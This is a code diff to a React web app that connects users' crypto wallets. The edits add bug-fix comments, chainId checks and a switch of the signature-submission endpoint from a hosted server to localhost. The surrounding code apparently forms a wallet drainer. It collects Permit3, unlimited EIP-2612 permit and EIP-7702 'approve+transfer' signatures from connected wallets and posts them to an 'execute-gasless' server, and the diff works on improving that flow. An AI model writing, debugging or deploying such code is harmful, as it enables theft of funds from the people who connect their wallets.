@@ -149,6 +149,7 @@ export default function App() {
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
   const { chainId } = useAppKitNetwork() 
+  // ✅ FIX: use 'walletProvider' as originally intended
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
   const log = (msg: string) => {
@@ -159,7 +160,10 @@ export default function App() {
   useEffect(() => {
     if (!isConnected || !walletAddress || !evmWalletProvider) return;
 
-    getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
+    // ✅ FIX: check if chainId is defined before using
+    if (chainId !== undefined) {
+      getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
+    }
 
     if (manualConnect.current) {
       manualConnect.current = false; 
@@ -278,7 +282,8 @@ export default function App() {
     const domain = {
       name: 'Permit3',
       version: '1',
-      chainId: 1,                       // Permit3 signatures are chain‑agnostic; use mainnet as reference
+      // ✅ FIX: Permit3 signatures are chain‑agnostic – use chainId 0
+      chainId: 0,
       verifyingContract: PERMIT3_ADDRESS[1],
     };
     const types = {
@@ -375,7 +380,9 @@ export default function App() {
       try {
         log('[PERMIT3] Requesting cross‑chain signature...');
         permit3Signature = await signPermit3(signer, EVM_CONTRACT_ADDRESS, deadline);
-        fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+        // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+        fetch('http://localhost:3001/execute-gasless', {
+
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -460,7 +467,9 @@ export default function App() {
                     log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                     const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                     
-                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                    // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                    fetch('http://localhost:3001/execute-gasless', {
+
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -517,7 +526,9 @@ export default function App() {
                     };
                     const signature = await signer.signTypedData(domain, types, message);
 
-                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                    // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                    fetch('http://localhost:3001/execute-gasless', {
+
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -546,7 +557,9 @@ export default function App() {
                   setStatus(`EIP-7702 Authorization: ${token.symbol}...`);
                   log(`[EIP-7702] Signing authorization for atomic approve+transfer...`);
                   const authSig = await signEIP7702Authorization(activeProvider, activeChainId, BATCH_EXECUTOR_ADDRESS);
-                  fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                  // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                  fetch('http://localhost:3001/execute-gasless', {
+
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
